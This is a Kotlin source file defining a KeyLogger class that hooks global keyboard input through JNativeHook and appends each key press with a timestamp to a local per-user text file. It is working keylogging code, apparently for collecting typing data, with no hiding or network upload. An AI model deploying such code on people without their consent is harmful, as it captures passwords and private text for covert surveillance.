package loggers.keyLogger

import org.jnativehook.GlobalScreen
import org.jnativehook.NativeHookException
import org.jnativehook.keyboard.NativeKeyEvent
import org.jnativehook.keyboard.NativeKeyListener
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import kotlin.system.exitProcess

class KeyLogger(username: String) : NativeKeyListener {

    private val mDateFormat = SimpleDateFormat("dd/M/yyyy HH:mm:ss.ms")

    private val pathToFile = "${System.getProperty("user.dir")}\\data\\${username}_Keys.txt"

    private var file: File = File(pathToFile)

    private fun setFile() {
        if (!file.exists()) file.createNewFile()
    }

    init {
        try {
            GlobalScreen.registerNativeHook()
        } catch (ex: NativeHookException) {
            System.err.println("There was a problem registering the native hook.")
            exitProcess(1)
        }

        setFile()

        GlobalScreen.addNativeKeyListener(this)
    }

    override fun nativeKeyPressed(e: NativeKeyEvent) {
        file.appendText("key=${NativeKeyEvent.getKeyText(e.keyCode)}, timestamp=${mDateFormat.format(Date())}\n")
    }

    override fun nativeKeyReleased(e: NativeKeyEvent) {
    }

    override fun nativeKeyTyped(e: NativeKeyEvent) {
    }

    fun stop() {
        GlobalScreen.removeNativeKeyListener(this)
        GlobalScreen.unregisterNativeHook()
    }

}